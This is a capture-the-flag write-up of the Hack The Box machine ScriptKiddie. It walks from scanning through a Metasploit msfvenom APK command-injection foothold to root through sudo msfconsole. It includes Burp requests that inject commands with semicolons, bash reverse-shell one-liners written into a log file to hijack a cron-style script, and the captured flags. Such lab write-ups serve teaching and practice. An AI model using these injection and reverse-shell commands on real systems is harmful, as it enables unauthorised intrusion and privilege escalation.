# Summary
### 1. NMAP
This is my first time attempting a live machine. Anyways, NMAP revealed two ports, Port 22 SSH and Port 5000 HTTP (Werkzeug httpd 0.16.1) port.

### 2. Port 5000 HTTP Enumeration
Visiting `http://10.129.72.251:5000/`, we see a site that acted as an interface to a Kali machine. The site could run NMAP, MSFVenom, & SearchSploit.

GoBuster didn't yield anything, and the Werkzeug exploit for Port 5000 HTTP did not work as we run a newer version of Werkzeug.

### 3. Port 5000 HTTP Attack Attempt 1
We try to use Burpsuite by modifying requests to the site. For example, the original data that was sent was `ip=127.0.0.1&action=scan` to do NMAP, and I tried to add an additional command at the back. Modifying with Burpsuite, a new command `ip=127.0.0.1%3Bpwd&action=scan` was sent, to emulate the command `nmap 127.0.0.1;pwd`. This did not work.

### 4. Port 5000 HTTP Attack Attempt 2
We got a clue from other HTB users that we need to focus more on exploits. We failed to find exploits when performing `searchsploit nmap`, `searchsploit searchsploit`, but `searchsploit msf` showed a potential exploit called `'msfd' Remote Code Execution (Metasploit)`.

We try it out, but again did not work.

### 5. Port 5000 HTTP Attack Attempt 3
This time however, we get a clue to look at a more recent CVE. We find one from Googling called `Metasploit Framework 6.0.11 - msfvenom APK template command injection`. Googling is indeed a skill. To use this Metasploit module, we needed to also update our Msfconsole.

The exploit `use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection` gave us a `.apk` file, which we then used to upload onto `http://10.129.72.251:5000/`, providing the `.apk` as a template. After running a listener and sending the file on the webpage, we get a shell and our user flag.

### 6. Privilege Escalation
Bwoah, this one is tough. From enumerating, we find that there are three users, `kid` which we compromised, and the two other users `pwn` & `root`.

We found an interesting file owned by user `pwn`, `scanlosers.sh`. In the file, we see that it reads from another file called `hackers`, and uses that information to execute a `NMAP` command. We hijack the `scanlosers.sh` script by manipulating the `hackers` file and getting a reverse shell to execute. Through this successful move, we got into user `pwn`.

### 7. Final Privilege Escalation & Getting Root Flag
Running `sudo -l`, we see that `msfconsole` can be run as a `sudo-er` without authentication. Exploiting this, we get root flags.

# Attack
## 1. NMAP
Took a long time to run, but here it is.
```
hippoeug@kali:~$ nmap --script vuln 10.129.72.251 -sC -sV -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 12:40 +08
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|_      CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.72.251
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.72.251:5000/
|     Form id: ip
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: os
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: search
|_    Form action: /
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Failed to upload and execute a payload.
|   
|_    Failed to upload and execute a payload.
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.8.5: 
|       CVE-2021-3177   7.5     https://vulners.com/cve/CVE-2021-3177
|       CVE-2020-27619  7.5     https://vulners.com/cve/CVE-2020-27619
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/       0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/        *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/    *EXPLOIT*
|_      MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/ *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Okay, so we know 2 ports opened, Port 22 SSH and a Port 5000 HTTP port. This Port 5000 is an interesting one, showing it's a Werkzeug httpd 0.16.1 (Python 3.8.5).

## 2. Port 5000 HTTP Enumeration
Let's visit `http://10.129.72.251:5000/` and see what we get.

![Site1](https://user-images.githubusercontent.com/21957042/113502212-65f53d00-955d-11eb-84a0-4c60ed026417.png)

Ah, a website that basically runs NMAP, MSFVenom, & SearchSploit for you. So theoritically, this web interface is directly connected to a actual Kali Linux machine? If badly configured, we can run direct commands to it! 

Anyways, let's try one of them NMAP. We will scan itself, META AF.

![NMAP](https://user-images.githubusercontent.com/21957042/113502211-655ca680-955d-11eb-8da6-e5156f39ef62.png)

It worked!

While we're at it, we run a quick GoBuster to see what we get.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.72.251:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.72.251:5000
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/07 12:51:30 Starting gobuster
===============================================================
===============================================================
2021/02/07 13:10:26 Finished
===============================================================
```
Nothing, no sub-directories.

Let's do a SearchSploit.
```
hippoeug@kali:~$ searchsploit werkzeug
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Werkzeug - 'Debug Shell' Command Execution                                                                                          | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                               | python/remote/37814.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Since there is a Metasploit module, let's give this a shot real quick.
```
msf5 > use exploit/multi/http/werkzeug_debug_rce
[*] No payload configured, defaulting to python/meterpreter/reverse_tcp
msf5 exploit(multi/http/werkzeug_debug_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   werkzeug 0.10 and older


msf5 exploit(multi/http/werkzeug_debug_rce) > show options
...
msf5 exploit(multi/http/werkzeug_debug_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[-] Secret code not detected.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/werkzeug_debug_rce) > 
```
Unfortunately, our version is newer and would not work!

## 3. Port 5000 HTTP Attack Attempt 1
Let's run Burp Suite and try to see what we get when running a the NMAP function.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1&action=scan
```
Interesting, let's try to run multiple commands by modifying the request on BurpSuite. 

We will use CyberChef URL Encode/Decode function, where `;` is `%3B`.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%3Bpwd&action=scan
```
Unforunately, this didn't work and we get an error `invalid ip`.

Another attempt at running another function SPLOITS.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug&action=searchsploit
```
And we change it on BurpSuite.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug%3Bpwd&action=searchsploit
```
This time however, we get an error `stop hacking me - well hack you back`.

![Stop](https://user-images.githubusercontent.com/21957042/113502213-65f53d00-955d-11eb-9c7b-0f7535656803.png)

## 4. Port 5000 HTTP Attack Attempt 2
With clues from online, it turns out that I needed more SearchSploits.
```
ippoeug@kali:~$ searchsploit nmap
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Android - binder Use-After-Free of VMA via race Between reclaim and munmap                                                          | android/dos/46357.txt
Android - Inter-Process munmap due to Race Condition in ashmem                                                                      | android/dos/43464.txt
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                     | multiple/remote/27135.rb
BaconMap 1.0 - Local File Disclosure                                                                                                | php/webapps/15234.txt
BaconMap 1.0 - SQL Injection                                                                                                        | php/webapps/15233.txt
Google Android - Inter-process munmap in android.util.MemoryIntArray                                                                | android/dos/41354.txt
Google Android - Inter-Process munmap with User-Controlled Size in android.graphics.Bitmap                                          | android/remote/40874.txt
Microsoft Edge - 'UnmapViewOfFile' ACG Bypass                                                                                       | windows/dos/44096.txt
Nmap - Arbitrary File Write                                                                                                         | linux/remote/38741.txt
Novell NetMail 3.52d - NMAP STOR Buffer Overflow (Metasploit)                                                                       | windows/remote/16813.rb
PaX - Double-Mirrored VMA munmap Privilege Escalation                                                                               | linux/local/876.c
Snortreport - '/nmap.php' / 'nbtscan.php' Remote Command Execution (Metasploit)                                                     | php/webapps/17947.rb
Zenmap (Nmap) 7.70 - Denial of Service (PoC)                                                                                        | windows_x86/dos/45357.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing here.
```
hippoeug@kali:~$ searchsploit searchsploit
Exploits: No Results
Shellcodes: No Results
```
Nope. Funny though.
```
hippoeug@kali:~$ searchsploit msf
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cisco IOS 12 MSFC2 - Layer 2 Frame Denial of Service                                                                                | hardware/dos/23638.pl
CmsFaethon 2.2.0 (ultimate.7z) - Multiple Vulnerabilities                                                                           | php/webapps/11894.txt
CmsFaethon 2.2.0 - 'item' SQL Injection                                                                                             | php/webapps/8054.pl
Joomla! Component com_jmsfileseller - Local File Inclusion                                                                          | php/webapps/17338.txt
Liferay Portal - Java Unmarshalling via JSONWS RCE (Metasploit)                                                                     | java/remote/48332.msf
Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)                                                                    | ruby/remote/44570.rb
Metasploit Framework - 'msfd' Remote Code Execution (via Browser) (Metasploit)                                                      | ruby/remote/44569.rb
Microsoft Edge Chakra - 'AppendLeftOverItemsFromEndSegment' Out-of-Bounds Read                                                      | windows/dos/43522.js
PHP-fusion dsmsf Mod Downloads - SQL Injection                                                                                      | php/webapps/12028.txt
unrar 5.40 - 'VMSF_DELTA' Filter Arbitrary Memory Write                                                                             | multiple/dos/42245.txt
webERP 4.0.1 - 'InputSerialItemsFile.php' Arbitrary File Upload                                                                     | php/webapps/35333.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcode Title                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux/x86 - Read File (/etc/passwd) + MSF Optimized Shellcode (61 bytes)                                                            | linux_x86/45416.c
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Ayy! `Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)` is looking promising, let's give that a shot!
```
msf5 > use exploit/multi/misc/msfd_rce_remote
[*] No payload configured, defaulting to generic/shell_reverse_tcp
...
msf5 exploit(multi/misc/msfd_rce_remote) > show options
...
msf5 exploit(multi/misc/msfd_rce_remote) > exploit

[*] Started reverse TCP handler on 10.10.x.x:6969 
[*] Exploit completed, but no session was created.
```
Nope. Time for something new.

## 5. Port 5000 HTTP Attack Attempt 3
With even more clues, it turns out there is a more recent CVE. 

There's a [`Metasploit Framework 6.0.11 - msfvenom APK template command injection`](https://www.exploit-db.com/exploits/49491) exploit, where an [advisory](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md) has been written for it. More importantly, a [guide](https://github.com/rapid7/metasploit-framework/pull/14331) of sorts to utilize this exploit.

Since there's a Metasploit module written for it, we shall use it.
```
msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name
...
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit

[+] msf.apk stored at /home/hippoeug/.msf4/local/msf.apk
```
Interesting! This generates a `.apk` file! 

We go back to `http://10.129.72.251:5000/` and upload this `.apk` file.

![msf](https://user-images.githubusercontent.com/21957042/113502209-642b7980-955d-11eb-82d0-0541ea99fb0e.png)

Before we run it, we also start a listener.
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.72.251:58800) at 2021-02-07 17:06:55 +0800

id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```
We got it! 

We can easily find our first flag.
```
pwd
/home/kid/html

cd ..
ls
html
logs
snap
user.txt
cat user.txt
05e59c0dba62dcb1bf331f88e92dcd16
```

## 6. Privilege Escalation
There are three users in this machine, `kid`, `pwn` and `root`. Since `pwn` is accessible, we enumerate it first.
```
pwd
/home
ls
kid
pwn
cd pwn
ls
recon
scanlosers.sh
```
There are two files in `pwn`!
```
ls -la
total 44
drwxr-xr-x 6 pwn  pwn  4096 Feb  3 12:06 .
drwxr-xr-x 4 root root 4096 Feb  3 07:40 ..
lrwxrwxrwx 1 root root    9 Feb  3 12:06 .bash_history -> /dev/null
-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
drwx------ 2 pwn  pwn  4096 Jan 28 17:08 .cache
drwxrwxr-x 3 pwn  pwn  4096 Jan 28 17:24 .local
-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
-rw-rw-r-- 1 pwn  pwn    74 Jan 28 16:22 .selected_editor
drwx------ 2 pwn  pwn  4096 Jan 28 16:32 .ssh
drwxrw---- 2 pwn  pwn  4096 Feb  7 06:10 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
```
Let's see what these files are about.
```
./scanlosers.sh
/bin/sh: 16: ./scanlosers.sh: Permission denied

cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
Interesting, let's change directory to `/home/kid/logs` and see what we get.
```
pwd
/home/kid/logs
ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
drwxr-xr-x 11 kid kid 4096 Feb  7 09:41 ..
-rw-rw-r--  1 kid pwn    0 Feb  7 05:54 hackers
```
This `hackers` file's group owner is `pwn`! 

Since the script reads from `$log` which is `log=/home/kid/logs/hackers`, we try write something to it.
```
ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  7 13:31 .
drwxr-xr-x 11 kid kid 4096 Feb  7 09:41 ..
-rw-rw-r--  1 kid pwn    0 Feb  7 13:38 hackers

echo "test" >> hackers

ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  7 13:31 .
drwxr-xr-x 11 kid kid 4096 Feb  7 09:41 ..
-rw-rw-r--  1 kid pwn    0 Feb  7 13:46 hackers
```
Even though the file size is still 0, the modified date changes.

I created my own version of the script to see what it does on my local machine.
```
cat test.sh
#!/bin/bash

log=/home/hippoeug/hackers

cd /home/hippoeug
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
Testing things here and there, I understood that only the third element onwards from the `hackers` file would be executed as a variable.

`sh -c` is also a executing command, and in this case it would be executed by user `pwn`. I intend to exploit this by spawning a reverse shell.
```
echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers

hippoeug@kali:~$ nc -lvnp 6969
listening on [any] 6969 ...
```
At this point, I was too frustrated to continue on, gave up and left.

BUT. I came back stronger (with some help)... and turns out I was really close to finishing it previously.

My command was almost right, and I needed 3 spaces at the front. `ignore ignore ` was 4 characters, not 3. I ended up using 3 spaces at the front instead.
```
echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/1234 0>&1' #" >> hackers

hippoeug@kali:~$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.x.x] from (UNKNOWN) [10.129.95.150] 41366
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 
```
Through this, I got into user `pwn`!

Alternatively, I could have written `echo "ignore  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.41/1234 0>&1' #" >> hackers`, with 2 spaces after `ignore`.

## 7. Final Privilege Escalation & Getting Root Flag
As seen in [`Blocky`](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Blocky.md), there was something we should always try when privilege escalating Linux machines.
```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
Indeed, this works!

Time to escalate as user `root` and get the flags!
```
pwn@scriptkiddie:~$ sudo msfconsole
...
msf6 > pwd
stty: 'standard input': Inappropriate ioctl for device
[*] exec: pwd

/home/pwn
...
msf6 > whoami
stty: 'standard input': Inappropriate ioctl for device
[*] exec: whoami

root
...
msf6 > pwd
stty: 'standard input': Inappropriate ioctl for device
[*] exec: pwd

/root
...
msf6 > ls
stty: 'standard input': Inappropriate ioctl for device
[*] exec: ls

root.txt
snap
...
msf6 > cat root.txt
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat root.txt

be03af4e25fa631012bf791a53a47195
```
Done! Finally!
